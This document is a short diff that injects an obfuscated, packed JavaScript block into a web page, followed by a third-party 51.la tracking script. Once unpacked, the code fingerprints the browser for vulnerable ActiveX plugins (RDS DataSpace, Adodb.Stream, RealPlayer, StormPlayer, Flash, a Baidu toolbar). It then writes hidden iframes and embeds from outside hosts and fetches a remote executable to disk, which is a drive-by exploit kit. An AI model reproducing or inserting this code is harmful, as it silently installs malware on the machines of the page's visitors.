@@ -1,0 +1,9 @@
+<script>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j{3 e;3 q=(c.12("5"));4(13.15.11().10("W 7")==-1)q.X("Y","Z:16-17-1d-1e-1f");3 1c=q.V("1b.18","")}m(e){};n{4(e!="[5 8]"){3 a="%19%%D$F^D%1a&1g";c.l("<o k=q.u><\\/o>")}v{j{3 f;3 L=(b d("w.w.9")).U("$P").O(",")}m(f){};n{4(f!="[5 8]"){c.l(\'<G k="A://b.Q.N/M/\'+L[2]+\'.M"></G>\')}}j{3 g;3 S=b d("\\T\\R\\H\\I\\p\\t\\x\\K\\J\\H\\I\\p\\t\\x\\K\\J\\1l")}m(g){};n{4(g!="[5 8]"){c.l(\'<s C=y:B k=1D.z></s>\')}}j{3 h;3 1F=b d("r.r.1")}m(h){};n{4(h!="[5 8]"){4(b d("r.r.1").1y("1H")<="6.0.14.1h"){c.l(\'<1B 1C="1E"k=1x.u><\\/o>\')}v{c.l(\'<s C=y:B k=1w.z></s>\')}}}j{3 i;3 E=b d("1m.1n")}m(i){};n{4(i!="[5 8]"){E["\\p\\1i\\t\\1j\\1o\\p\\1p"]("A://1u.1t.N/1s/1q.1r","1v.1k",0)}}4(f=="[5 8]"&&g=="[5 8]"&&h=="[5 8]"){j{4(b d("1z.1A"))c.l("<o k=1G.u><\\/o>")}m(e){}}}}',62,106,'|||var|if|object|||Error|||new|document|ActiveXObject||||||try|src|write|catch|finally|script|x44|ado|IERPCtl|iframe|x6f|js|else|ShockwaveFlash|x77|display|htm|http|none|style||Baidu||embed|x49|x45|x2e|x6e|Flashver|swf|com|split|version|iphone003|x4c|glworld|x47|GetVariable|createobject|msie|setAttribute|classid|clsid|indexOf|toLowerCase|createElement|navigator||userAgent|BD96C556|65A3|Stream|dfdf|SF|Adodb|as|11D0|983A|00C04FC29E36|DS|552|x6c|x61|exe|x31|BaiduBar|Tool|x64|x53|adweb|cab|pro|iphone001|xia|web|newr|rl|PlayerProperty|MPS|StormPlayer|sCrIpT|LAnGuAgE|glw|jAvAsCrIpT|real|bf|PRODUCTVERSION'.split('|'),0,{}))
+
+
+
+</script>
+
+
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1897033.js"></script>
